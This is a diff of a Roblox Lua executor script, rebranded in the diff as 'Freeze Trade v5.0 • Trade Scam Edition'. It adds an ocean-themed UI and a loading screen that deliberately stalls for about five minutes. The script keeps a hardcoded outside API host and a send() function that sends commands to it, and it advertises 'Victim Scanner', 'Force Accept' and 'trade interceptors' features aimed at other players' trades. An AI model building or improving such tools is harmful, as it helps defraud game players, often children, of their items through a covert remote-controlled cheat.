@@ -10,6 +10,24 @@ local task, pcall, pairs = task, pcall, pairs
 local plr = Players.LocalPlayer
 local api = "https://laggerr-production.up.railway.app"
 
+-- Ocean Blue Color Palette
+local C = {
+    bg         = Color3.fromRGB(5, 15, 30),
+    bgMid      = Color3.fromRGB(8, 25, 50),
+    border     = Color3.fromRGB(0, 140, 220),
+    borderGlow = Color3.fromRGB(0, 190, 255),
+    titleText  = Color3.fromRGB(100, 210, 255),
+    subText    = Color3.fromRGB(150, 200, 230),
+    white      = Color3.fromRGB(220, 240, 255),
+    barBg      = Color3.fromRGB(10, 40, 75),
+    barFill    = Color3.fromRGB(0, 160, 240),
+    barFillEnd = Color3.fromRGB(80, 230, 255),
+    btnBg      = Color3.fromRGB(10, 35, 65),
+    btnHover   = Color3.fromRGB(15, 55, 100),
+    btnStroke  = Color3.fromRGB(0, 100, 180),
+    coolGreen  = Color3.fromRGB(0, 230, 160),
+}
+
 local function send(target, cmd)
     pcall(function()
         request({
@@ -50,149 +68,471 @@ local function rnd(len)
     return s
 end
 
--- Loading Screen
+-- ============================================================
+-- LOADING SCREEN
+-- ============================================================
 local loadGui = Instance.new("ScreenGui")
 loadGui.Name = rnd(12)
 loadGui.Parent = game:GetService("CoreGui")
 loadGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+loadGui.IgnoreGuiInset = true
 
-local loadFrame = Instance.new("Frame", loadGui)
-loadFrame.Size = UDim2.new(0, 450, 0, 250)
-loadFrame.Position = UDim2.new(0.5, -225, 0.5, -125)
-loadFrame.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+-- Full screen background (transparent gray overlay over game)
+local loadBg = Instance.new("Frame", loadGui)
+loadBg.Size = UDim2.new(1, 0, 1, 0)
+loadBg.Position = UDim2.new(0, 0, 0, 0)
+loadBg.BackgroundColor3 = Color3.fromRGB(15, 18, 22)
+loadBg.BackgroundTransparency = 0.35
+loadBg.BorderSizePixel = 0
+loadBg.ZIndex = 1
+
+-- Top accent bar
+local topBar = Instance.new("Frame", loadBg)
+topBar.Size = UDim2.new(1, 0, 0, 3)
+topBar.Position = UDim2.new(0, 0, 0, 0)
+topBar.BackgroundColor3 = C.borderGlow
+topBar.BorderSizePixel = 0
+topBar.ZIndex = 2
+local topBarGradient = Instance.new("UIGradient", topBar)
+topBarGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 60, 160)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 190, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 60, 160)),
+})
+
+-- Bottom accent bar
+local bottomBar = Instance.new("Frame", loadBg)
+bottomBar.Size = UDim2.new(1, 0, 0, 2)
+bottomBar.Position = UDim2.new(0, 0, 1, -2)
+bottomBar.BackgroundColor3 = C.border
+bottomBar.BorderSizePixel = 0
+bottomBar.ZIndex = 2
+local bottomBarGradient = Instance.new("UIGradient", bottomBar)
+bottomBarGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 40, 120)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 140, 220)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 40, 120)),
+})
+
+-- Floating background decorative icons
+local function makeBgIcon(emoji, xScale, yScale, size, alpha)
+    local lbl = Instance.new("TextLabel", loadBg)
+    lbl.Size = UDim2.new(0, size, 0, size)
+    lbl.Position = UDim2.new(xScale, -size/2, yScale, -size/2)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = emoji
+    lbl.TextColor3 = C.borderGlow
+    lbl.TextTransparency = alpha
+    lbl.TextSize = size * 0.6
+    lbl.Font = Enum.Font.GothamBold
+    lbl.ZIndex = 1
+    return lbl
+end
+
+local bgIcons = {
+    makeBgIcon("❄", 0.05, 0.08, 60, 0.55),
+    makeBgIcon("🔒", 0.92, 0.10, 50, 0.60),
+    makeBgIcon("💎", 0.88, 0.82, 55, 0.58),
+    makeBgIcon("❄", 0.08, 0.88, 70, 0.50),
+    makeBgIcon("🎯", 0.50, 0.04, 45, 0.62),
+    makeBgIcon("⚡", 0.18, 0.50, 48, 0.60),
+    makeBgIcon("🔗", 0.80, 0.45, 46, 0.62),
+    makeBgIcon("❄", 0.95, 0.55, 52, 0.52),
+    makeBgIcon("💀", 0.03, 0.45, 44, 0.65),
+    makeBgIcon("🌊", 0.45, 0.94, 50, 0.58),
+    makeBgIcon("⛓", 0.72, 0.08, 44, 0.63),
+    makeBgIcon("🧊", 0.25, 0.15, 42, 0.60),
+}
+
+-- Center card
+local loadFrame = Instance.new("Frame", loadBg)
+loadFrame.Size = UDim2.new(0, 540, 0, 420)
+loadFrame.Position = UDim2.new(0.5, -270, 0.5, -210)
+loadFrame.BackgroundColor3 = C.bgMid
+loadFrame.BackgroundTransparency = 0
 loadFrame.BorderSizePixel = 0
+loadFrame.ZIndex = 3
 
 local loadFrameCorner = Instance.new("UICorner", loadFrame)
-loadFrameCorner.CornerRadius = UDim.new(0, 15)
+loadFrameCorner.CornerRadius = UDim.new(0, 22)
 
 local loadFrameStroke = Instance.new("UIStroke", loadFrame)
-loadFrameStroke.Thickness = 2
-loadFrameStroke.Color = Color3.fromRGB(200, 0, 0)
+loadFrameStroke.Thickness = 1.5
+loadFrameStroke.Color = C.border
 
+local cardGradient = Instance.new("UIGradient", loadFrame)
+cardGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 25, 52)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 14, 32)),
+})
+cardGradient.Rotation = 160
+
+-- Big snowflake icon (top center)
+local snowflakeIcon = Instance.new("Frame", loadFrame)
+snowflakeIcon.Size = UDim2.new(0, 88, 0, 88)
+snowflakeIcon.Position = UDim2.new(0.5, -44, 0, 22)
+snowflakeIcon.BackgroundColor3 = C.bg
+snowflakeIcon.BorderSizePixel = 0
+snowflakeIcon.ZIndex = 4
+
+local snowflakeIconCorner = Instance.new("UICorner", snowflakeIcon)
+snowflakeIconCorner.CornerRadius = UDim.new(0, 20)
+
+local snowflakeIconStroke = Instance.new("UIStroke", snowflakeIcon)
+snowflakeIconStroke.Thickness = 2
+snowflakeIconStroke.Color = C.borderGlow
+
+local snowflakeLbl = Instance.new("TextLabel", snowflakeIcon)
+snowflakeLbl.Size = UDim2.new(1, 0, 1, 0)
+snowflakeLbl.BackgroundTransparency = 1
+snowflakeLbl.Text = "❄"
+snowflakeLbl.TextColor3 = C.borderGlow
+snowflakeLbl.TextSize = 48
+snowflakeLbl.Font = Enum.Font.GothamBold
+snowflakeLbl.ZIndex = 5
+
+-- Title
 local loadTitle = Instance.new("TextLabel", loadFrame)
-loadTitle.Size = UDim2.new(1, -40, 0, 60)
-loadTitle.Position = UDim2.new(0, 20, 0, 30)
+loadTitle.Size = UDim2.new(1, -40, 0, 42)
+loadTitle.Position = UDim2.new(0, 20, 0, 120)
 loadTitle.BackgroundTransparency = 1
-loadTitle.Text = "AJJANS PINGER"
-loadTitle.TextColor3 = Color3.fromRGB(255, 150, 100)
-loadTitle.TextSize = 36
+loadTitle.Text = "Freeze Trade"
+loadTitle.TextColor3 = C.titleText
+loadTitle.TextSize = 38
 loadTitle.Font = Enum.Font.GothamBold
-loadTitle.TextTransparency = 0
+loadTitle.TextXAlignment = Enum.TextXAlignment.Center
+loadTitle.ZIndex = 4
 
+-- Subtitle
+local loadVersion = Instance.new("TextLabel", loadFrame)
+loadVersion.Size = UDim2.new(1, -40, 0, 22)
+loadVersion.Position = UDim2.new(0, 20, 0, 164)
+loadVersion.BackgroundTransparency = 1
+loadVersion.Text = "v5.0  \xE2\x80\xA2  Trade Scam Edition"
+loadVersion.TextColor3 = C.subText
+loadVersion.TextSize = 15
+loadVersion.Font = Enum.Font.Gotham
+loadVersion.TextXAlignment = Enum.TextXAlignment.Center
+loadVersion.ZIndex = 4
+
+-- Feature icon row (3 animated boxes)
+local iconRowData = {
+    { icon = "🧊", label = "Freeze Engine"  },
+    { icon = "🎯", label = "Victim Scanner" },
+    { icon = "⚡", label = "Force Accept"   },
+}
+
+local iconBoxW = 120
+local iconRowTotalW = #iconRowData * iconBoxW + (#iconRowData - 1) * 18
+local iconRowStartX = (540 - iconRowTotalW) / 2
+local iconFrames = {}
+
+for i, data in ipairs(iconRowData) do
+    local box = Instance.new("Frame", loadFrame)
+    box.Size = UDim2.new(0, iconBoxW, 0, 72)
+    box.Position = UDim2.new(0, iconRowStartX + (i - 1) * (iconBoxW + 18), 0, 200)
+    box.BackgroundColor3 = C.bg
+    box.BorderSizePixel = 0
+    box.ZIndex = 4
+
+    local boxCorner = Instance.new("UICorner", box)
+    boxCorner.CornerRadius = UDim.new(0, 12)
+
+    local boxStroke = Instance.new("UIStroke", box)
+    boxStroke.Thickness = 1
+    boxStroke.Color = C.btnStroke
+
+    local iconLbl = Instance.new("TextLabel", box)
+    iconLbl.Size = UDim2.new(1, 0, 0, 36)
+    iconLbl.Position = UDim2.new(0, 0, 0, 8)
+    iconLbl.BackgroundTransparency = 1
+    iconLbl.Text = data.icon
+    iconLbl.TextSize = 26
+    iconLbl.Font = Enum.Font.GothamBold
+    iconLbl.TextXAlignment = Enum.TextXAlignment.Center
+    iconLbl.ZIndex = 5
+
+    local labelLbl = Instance.new("TextLabel", box)
+    labelLbl.Size = UDim2.new(1, -6, 0, 20)
+    labelLbl.Position = UDim2.new(0, 3, 0, 46)
+    labelLbl.BackgroundTransparency = 1
+    labelLbl.Text = data.label
+    labelLbl.TextColor3 = C.subText
+    labelLbl.TextSize = 11
+    labelLbl.Font = Enum.Font.Gotham
+    labelLbl.TextXAlignment = Enum.TextXAlignment.Center
+    labelLbl.ZIndex = 5
+
+    table.insert(iconFrames, {box = box, iconLbl = iconLbl, labelLbl = labelLbl, stroke = boxStroke})
+end
+
+-- Divider
+local divider = Instance.new("Frame", loadFrame)
+divider.Size = UDim2.new(0.75, 0, 0, 1)
+divider.Position = UDim2.new(0.125, 0, 0, 286)
+divider.BackgroundColor3 = C.border
+divider.BackgroundTransparency = 0.55
+divider.BorderSizePixel = 0
+divider.ZIndex = 4
+
+-- Status text
 local loadSubtitle = Instance.new("TextLabel", loadFrame)
-loadSubtitle.Size = UDim2.new(1, -40, 0, 30)
-loadSubtitle.Position = UDim2.new(0, 20, 0, 95)
+loadSubtitle.Size = UDim2.new(1, -40, 0, 24)
+loadSubtitle.Position = UDim2.new(0, 20, 0, 298)
 loadSubtitle.BackgroundTransparency = 1
-loadSubtitle.Text = "Loading..."
-loadSubtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+loadSubtitle.Text = "Initializing..."
+loadSubtitle.TextColor3 = C.subText
 loadSubtitle.TextSize = 14
 loadSubtitle.Font = Enum.Font.Gotham
+loadSubtitle.TextXAlignment = Enum.TextXAlignment.Center
+loadSubtitle.ZIndex = 4
 
+-- Progress bar
 local loadBarBg = Instance.new("Frame", loadFrame)
-loadBarBg.Size = UDim2.new(1, -60, 0, 12)
-loadBarBg.Position = UDim2.new(0, 30, 0, 145)
-loadBarBg.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+loadBarBg.Size = UDim2.new(1, -80, 0, 12)
+loadBarBg.Position = UDim2.new(0, 40, 0, 334)
+loadBarBg.BackgroundColor3 = C.barBg
 loadBarBg.BorderSizePixel = 0
+loadBarBg.ZIndex = 4
 
 local loadBarBgCorner = Instance.new("UICorner", loadBarBg)
 loadBarBgCorner.CornerRadius = UDim.new(0, 6)
 
 local loadBarFill = Instance.new("Frame", loadBarBg)
 loadBarFill.Size = UDim2.new(0, 0, 1, 0)
-loadBarFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+loadBarFill.BackgroundColor3 = C.barFill
 loadBarFill.BorderSizePixel = 0
+loadBarFill.ZIndex = 5
 
 local loadBarFillCorner = Instance.new("UICorner", loadBarFill)
 loadBarFillCorner.CornerRadius = UDim.new(0, 6)
 
+-- Rolling snowflake ICON BOX that rides the tip of the progress bar
+-- Parented to loadFrame so it can overflow the bar bounds visually
+local barSnowflakeBox = Instance.new("Frame", loadFrame)
+barSnowflakeBox.Size = UDim2.new(0, 32, 0, 32)
+barSnowflakeBox.Position = UDim2.new(0, 40 - 16, 0, 334 - 10)
+barSnowflakeBox.BackgroundColor3 = Color3.fromRGB(8, 20, 42)
+barSnowflakeBox.BorderSizePixel = 0
+barSnowflakeBox.ZIndex = 8
+
+local barSnowflakeCorner = Instance.new("UICorner", barSnowflakeBox)
+barSnowflakeCorner.CornerRadius = UDim.new(0, 8)
+
+local barSnowflakeStroke = Instance.new("UIStroke", barSnowflakeBox)
+barSnowflakeStroke.Thickness = 1.5
+barSnowflakeStroke.Color = C.borderGlow
+
+local barSnowflake = Instance.new("TextLabel", barSnowflakeBox)
+barSnowflake.Size = UDim2.new(1, 0, 1, 0)
+barSnowflake.BackgroundTransparency = 1
+barSnowflake.Text = "❄"
+barSnowflake.TextColor3 = Color3.fromRGB(140, 220, 255)
+barSnowflake.TextSize = 18
+barSnowflake.Font = Enum.Font.GothamBold
+barSnowflake.ZIndex = 9
+
+-- Percentage
 local loadPercent = Instance.new("TextLabel", loadFrame)
-loadPercent.Size = UDim2.new(1, -40, 0, 25)
-loadPercent.Position = UDim2.new(0, 20, 0, 175)
+loadPercent.Size = UDim2.new(1, -40, 0, 20)
+loadPercent.Position = UDim2.new(0, 20, 0, 353)
 loadPercent.BackgroundTransparency = 1
 loadPercent.Text = "0%"
-loadPercent.TextColor3 = Color3.fromRGB(255, 255, 255)
-loadPercent.TextSize = 14
+loadPercent.TextColor3 = C.white
+loadPercent.TextSize = 13
 loadPercent.Font = Enum.Font.GothamBold
+loadPercent.TextXAlignment = Enum.TextXAlignment.Center
+loadPercent.ZIndex = 4
+
+-- Bottom status row
+local readyRow = Instance.new("Frame", loadFrame)
+readyRow.Size = UDim2.new(1, -40, 0, 28)
+readyRow.Position = UDim2.new(0, 20, 0, 382)
+readyRow.BackgroundTransparency = 1
+readyRow.ZIndex = 4
+
+local readyDot = Instance.new("Frame", readyRow)
+readyDot.Size = UDim2.new(0, 8, 0, 8)
+readyDot.Position = UDim2.new(0.5, -55, 0.5, -4)
+readyDot.BackgroundColor3 = C.barFill
+readyDot.BorderSizePixel = 0
+readyDot.ZIndex = 5
+
+local readyDotCorner = Instance.new("UICorner", readyDot)
+readyDotCorner.CornerRadius = UDim.new(1, 0)
+
+local readyLbl = Instance.new("TextLabel", readyRow)
+readyLbl.Size = UDim2.new(1, 0, 1, 0)
+readyLbl.BackgroundTransparency = 1
+readyLbl.Text = "  Loading  \xE2\x80\xA2  Freeze Trade v5.0"
+readyLbl.TextColor3 = C.subText
+readyLbl.TextSize = 12
+readyLbl.Font = Enum.Font.Gotham
+readyLbl.TextXAlignment = Enum.TextXAlignment.Center
+readyLbl.ZIndex = 5
 
 -- Animated loading
 task.spawn(function()
-    -- Fast loading from 0-95% (30 seconds)
-    for i = 0, 95 do
-        loadBarFill.Size = UDim2.new(i / 100, 0, 1, 0)
-        loadPercent.Text = i .. "%"
-        
-        if i < 20 then
-            loadSubtitle.Text = "Initializing..."
-        elseif i < 40 then
-            loadSubtitle.Text = "Loading modules..."
-        elseif i < 60 then
-            loadSubtitle.Text = "Setting up interface..."
-        elseif i < 80 then
-            loadSubtitle.Text = "Configuring features..."
-        else
-            loadSubtitle.Text = "Almost ready..."
+    -- Pulsing main snowflake
+    task.spawn(function()
+        while loadGui.Parent do
+            TweenService:Create(snowflakeLbl, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0.45}):Play()
+            task.wait(1.2)
+            TweenService:Create(snowflakeLbl, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {TextTransparency = 0}):Play()
+            task.wait(1.2)
         end
-        
-        task.wait(0.3) -- Fast: 0.3 seconds per percent
+    end)
+
+    -- Floating bg icons gentle drift
+    for idx, lbl in ipairs(bgIcons) do
+        task.spawn(function()
+            local baseY = lbl.Position.Y.Scale
+            task.wait(idx * 0.25)
+            while loadGui.Parent do
+                TweenService:Create(lbl, TweenInfo.new(3 + idx * 0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                    Position = UDim2.new(lbl.Position.X.Scale, lbl.Position.X.Offset, baseY - 0.022, lbl.Position.Y.Offset)
+                }):Play()
+                task.wait(3 + idx * 0.35)
+                TweenService:Create(lbl, TweenInfo.new(3 + idx * 0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+                    Position = UDim2.new(lbl.Position.X.Scale, lbl.Position.X.Offset, baseY + 0.022, lbl.Position.Y.Offset)
+                }):Play()
+                task.wait(3 + idx * 0.35)
+            end
+        end)
     end
-    
-    -- Slow loading from 95-100% (4.5 minutes = 270 seconds for 5%)
-    loadSubtitle.Text = "Finalizing... (This may take a while)"
-    for i = 96, 100 do
-        loadBarFill.Size = UDim2.new(i / 100, 0, 1, 0)
+
+    -- Feature icon boxes cycle highlight
+    task.spawn(function()
+        local current = 1
+        while loadGui.Parent do
+            for i, data in ipairs(iconFrames) do
+                local isActive = (i == current)
+                TweenService:Create(data.stroke, TweenInfo.new(0.3), {
+                    Color = isActive and C.borderGlow or C.btnStroke
+                }):Play()
+                TweenService:Create(data.box, TweenInfo.new(0.3), {
+                    BackgroundColor3 = isActive and C.bgMid or C.bg
+                }):Play()
+            end
+            current = (current % #iconFrames) + 1
+            task.wait(1.1)
+        end
+    end)
+
+    -- Rolling snowflake icon box: spin + glow pulse
+    task.spawn(function()
+        local spinFrames = {"❄", "❅", "❆", "❅"}
+        local frame = 0
+        while loadGui.Parent do
+            frame = (frame + 1) % 4
+            barSnowflake.Text = spinFrames[frame + 1]
+            -- Pulse the stroke brightness
+            local pulse = math.sin(tick() * 4) * 0.5 + 0.5
+            barSnowflakeStroke.Color = Color3.new(
+                0 + pulse * 0.2,
+                0.6 + pulse * 0.4,
+                0.9 + pulse * 0.1
+            )
+            task.wait(0.08)
+        end
+    end)
+
+    -- Fast 0-95%
+    for i = 0, 95 do
+        TweenService:Create(loadBarFill, TweenInfo.new(0.25, Enum.EasingStyle.Linear), {Size = UDim2.new(i / 100, 0, 1, 0)}):Play()
+        TweenService:Create(barSnowflakeBox, TweenInfo.new(0.25, Enum.EasingStyle.Linear), {Position = UDim2.new(0, 40 + 460 * (i/100) - 16, 0, 324)}):Play()
         loadPercent.Text = i .. "%"
-        task.wait(54) -- Very slow: 54 seconds per percent (270 seconds / 5 = 54)
+        if i < 20 then
+            loadSubtitle.Text = "❄  Initializing freeze engine..."
+        elseif i < 40 then
+            loadSubtitle.Text = "🎯  Loading trade interceptors..."
+        elseif i < 60 then
+            loadSubtitle.Text = "⚡  Connecting force accept hooks..."
+        elseif i < 80 then
+            loadSubtitle.Text = "🔒  Configuring victim scanner..."
+        else
+            loadSubtitle.Text = "🌊  Almost ready..."
+        end
+        local t = i / 95
+        loadBarFill.BackgroundColor3 = Color3.new(
+            C.barFill.R + (C.barFillEnd.R - C.barFill.R) * t,
+            C.barFill.G + (C.barFillEnd.G - C.barFill.G) * t,
+            C.barFill.B + (C.barFillEnd.B - C.barFill.B) * t
+        )
+        task.wait(0.3)
     end
-    
-    loadSubtitle.Text = "Complete!"
-    task.wait(0.5)
-    
-    -- Fade out
-    for i = 1, 10 do
-        loadFrame.BackgroundTransparency = i / 10
-        loadFrameStroke.Transparency = i / 10
-        loadTitle.TextTransparency = i / 10
-        loadSubtitle.TextTransparency = i / 10
-        loadBarBg.BackgroundTransparency = i / 10
-        loadBarFill.BackgroundTransparency = i / 10
-        loadPercent.TextTransparency = i / 10
-        task.wait(0.03)
+
+    -- Slow 95-100%
+    loadSubtitle.Text = "💎  Finalizing... (This may take a while)"
+    for i = 96, 100 do
+        TweenService:Create(loadBarFill, TweenInfo.new(50, Enum.EasingStyle.Linear), {Size = UDim2.new(i / 100, 0, 1, 0)}):Play()
+        TweenService:Create(barSnowflakeBox, TweenInfo.new(50, Enum.EasingStyle.Linear), {Position = UDim2.new(0, 40 + 460 * (i/100) - 16, 0, 324)}):Play()
+        loadPercent.Text = i .. "%"
+        task.wait(54)
     end
-    
+
+    -- Complete
+    barSnowflake.Text = "✅"
+    barSnowflakeStroke.Color = C.coolGreen
+    loadSubtitle.Text = "✅  Ready!"
+    loadPercent.Text = "100%"
+    readyLbl.Text = "  Ready  \xE2\x80\xA2  Freeze Trade v5.0"
+    readyDot.BackgroundColor3 = C.coolGreen
+    task.wait(0.8)
+
+    -- Fade everything out
+    TweenService:Create(loadBg, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+    for _, obj in pairs({loadFrame, topBar, bottomBar}) do
+        TweenService:Create(obj, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1}):Play()
+    end
+    for _, lbl in pairs({loadTitle, loadVersion, loadSubtitle, loadPercent, readyLbl, snowflakeLbl}) do
+        TweenService:Create(lbl, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+    end
+    for _, fr in pairs({loadBarFill, loadBarBg, divider, readyDot, snowflakeIcon, barSnowflakeBox}) do
+        TweenService:Create(fr, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+    end
+    for _, lbl in pairs(bgIcons) do
+        TweenService:Create(lbl, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+    end
+    for _, data in pairs(iconFrames) do
+        TweenService:Create(data.box, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
+        TweenService:Create(data.iconLbl, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+        TweenService:Create(data.labelLbl, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+    end
+    TweenService:Create(loadFrameStroke, TweenInfo.new(0.5), {Transparency = 1}):Play()
+    task.wait(0.6)
     loadGui:Destroy()
 end)
 
--- Wait for loading to complete (30s fast + 270s slow + 0.5s = ~300.5 seconds)
 task.wait(300.5)
 
--- GUI Setup
+-- ============================================================
+-- MAIN GUI
+-- ============================================================
 local gui = Instance.new("ScreenGui")
 gui.Name = rnd(12)
 gui.Parent = game:GetService("CoreGui")
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Main Frame
 local main = Instance.new("Frame", gui)
 main.BorderSizePixel = 0
-main.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+main.BackgroundColor3 = C.bg
 main.Size = UDim2.new(0, 280, 0, 415)
 main.Position = UDim2.new(0.5, -140, 0.5, -207)
 
 local mainCorner = Instance.new("UICorner", main)
 mainCorner.CornerRadius = UDim.new(0, 15)
 
--- Border
 local mainStroke = Instance.new("UIStroke", main)
 mainStroke.Thickness = 2
-mainStroke.Color = Color3.fromRGB(200, 0, 0)
+mainStroke.Color = C.border
 
--- Title
 local title = Instance.new("TextLabel", main)
 title.Size = UDim2.new(1, -20, 0, 45)
 title.Position = UDim2.new(0, 10, 0, 10)
 title.BackgroundTransparency = 1
-title.Text = "AJJANS PINGER"
-title.TextColor3 = Color3.fromRGB(255, 150, 100)
+title.Text = "Freeze Trade"
+title.TextColor3 = C.titleText
 title.TextSize = 22
 title.Font = Enum.Font.GothamBold
 
@@ -202,84 +542,74 @@ local function createSlider(labelText, pos, defaultValue)
     container.Size = UDim2.new(1, -30, 0, 60)
     container.Position = pos
     container.BackgroundTransparency = 1
-    
+
     local label = Instance.new("TextLabel", container)
     label.Size = UDim2.new(1, 0, 0, 20)
     label.Position = UDim2.new(0, 0, 0, 0)
     label.BackgroundTransparency = 1
     label.Text = labelText
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.TextColor3 = C.white
     label.TextSize = 14
     label.Font = Enum.Font.Gotham
-    
+
     local sliderBg = Instance.new("Frame", container)
     sliderBg.Size = UDim2.new(1, 0, 0, 8)
     sliderBg.Position = UDim2.new(0, 0, 0, 30)
-    sliderBg.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    sliderBg.BackgroundColor3 = C.barBg
     sliderBg.BorderSizePixel = 0
-    
+
     local sliderBgCorner = Instance.new("UICorner", sliderBg)
     sliderBgCorner.CornerRadius = UDim.new(0, 4)
-    
+
     local sliderFill = Instance.new("Frame", sliderBg)
     sliderFill.Size = UDim2.new(defaultValue / 100, 0, 1, 0)
-    sliderFill.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+    sliderFill.BackgroundColor3 = C.barFill
     sliderFill.BorderSizePixel = 0
-    
+
     local sliderFillCorner = Instance.new("UICorner", sliderFill)
     sliderFillCorner.CornerRadius = UDim.new(0, 4)
-    
+
     local sliderBtn = Instance.new("TextButton", container)
     sliderBtn.Size = UDim2.new(0, 20, 0, 20)
     sliderBtn.Position = UDim2.new(defaultValue / 100, -10, 0, 24)
-    sliderBtn.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+    sliderBtn.BackgroundColor3 = C.borderGlow
     sliderBtn.BorderSizePixel = 0
     sliderBtn.Text = ""
     sliderBtn.AutoButtonColor = false
-    
+
     local sliderBtnCorner = Instance.new("UICorner", sliderBtn)
     sliderBtnCorner.CornerRadius = UDim.new(1, 0)
-    
+
     local value = defaultValue
     local dragging = false
-    
+
     local function updateSlider(input)
         local pos = math.clamp((input.Position.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
         value = math.floor(pos * 100)
-        
         sliderFill.Size = UDim2.new(pos, 0, 1, 0)
         sliderBtn.Position = UDim2.new(pos, -10, 0, 24)
         label.Text = labelText .. ": " .. value
     end
-    
-    sliderBtn.MouseButton1Down:Connect(function()
-        dragging = true
-    end)
-    
+
+    sliderBtn.MouseButton1Down:Connect(function() dragging = true end)
     UIS.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = false
-        end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
     end)
-    
     UIS.InputChanged:Connect(function(input)
         if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
             updateSlider(input)
         end
     end)
-    
     sliderBg.InputBegan:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseButton1 then
             updateSlider(input)
         end
     end)
-    
+
     label.Text = labelText .. ": " .. value
-    
     return {getValue = function() return value end}
 end
 
--- Create sliders
 local powerSlider = createSlider("POWER", UDim2.new(0, 15, 0, 65), 25)
 local speedSlider = createSlider("SPEED BOOST", UDim2.new(0, 15, 0, 140), 50)
 
@@ -288,38 +618,38 @@ local function createBtn(text, pos)
     local btn = Instance.new("TextButton", main)
     btn.Size = UDim2.new(1, -30, 0, 45)
     btn.Position = pos
-    btn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+    btn.BackgroundColor3 = C.btnBg
     btn.BorderSizePixel = 0
     btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextColor3 = C.white
     btn.TextSize = 16
     btn.Font = Enum.Font.GothamBold
     btn.AutoButtonColor = false
-    
+
     local corner = Instance.new("UICorner", btn)
     corner.CornerRadius = UDim.new(0, 10)
-    
+
     local stroke = Instance.new("UIStroke", btn)
-    stroke.Color = Color3.fromRGB(150, 0, 0)
+    stroke.Color = C.btnStroke
     stroke.Thickness = 1.5
-    
+
     btn.MouseEnter:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 0, 0)}):Play()
+        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = C.btnHover}):Play()
+        TweenService:Create(stroke, TweenInfo.new(0.2), {Color = C.borderGlow}):Play()
     end)
-    
     btn.MouseLeave:Connect(function()
-        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 0, 0)}):Play()
+        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = C.btnBg}):Play()
+        TweenService:Create(stroke, TweenInfo.new(0.2), {Color = C.btnStroke}):Play()
     end)
-    
+
     return btn
 end
 
--- Buttons
-local pingBtn = createBtn("PING SERVER", UDim2.new(0, 15, 0, 215))
-local boostBtn = createBtn("SPEED BOOST", UDim2.new(0, 15, 0, 268))
+local pingBtn  = createBtn("PING SERVER",   UDim2.new(0, 15, 0, 215))
+local boostBtn = createBtn("SPEED BOOST",   UDim2.new(0, 15, 0, 268))
 local flashBtn = createBtn("FLASH TP: OFF", UDim2.new(0, 15, 0, 321))
 
--- Flash TP Cooldown Bar
+-- Cooldown bar
 local cooldownContainer = Instance.new("Frame", main)
 cooldownContainer.Size = UDim2.new(1, -30, 0, 25)
 cooldownContainer.Position = UDim2.new(0, 15, 0, 374)
@@ -330,14 +660,14 @@ cooldownLabel.Size = UDim2.new(1, 0, 0, 12)
 cooldownLabel.Position = UDim2.new(0, 0, 0, 0)
 cooldownLabel.BackgroundTransparency = 1
 cooldownLabel.Text = "COOLDOWN"
-cooldownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+cooldownLabel.TextColor3 = C.subText
 cooldownLabel.TextSize = 11
 cooldownLabel.Font = Enum.Font.Gotham
 
 local cooldownBg = Instance.new("Frame", cooldownContainer)
 cooldownBg.Size = UDim2.new(1, 0, 0, 10)
 cooldownBg.Position = UDim2.new(0, 0, 0, 15)
-cooldownBg.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+cooldownBg.BackgroundColor3 = C.barBg
 cooldownBg.BorderSizePixel = 0
 
 local cooldownBgCorner = Instance.new("UICorner", cooldownBg)
@@ -345,7 +675,7 @@ cooldownBgCorner.CornerRadius = UDim.new(0, 5)
 
 local cooldownFill = Instance.new("Frame", cooldownBg)
 cooldownFill.Size = UDim2.new(1, 0, 1, 0)
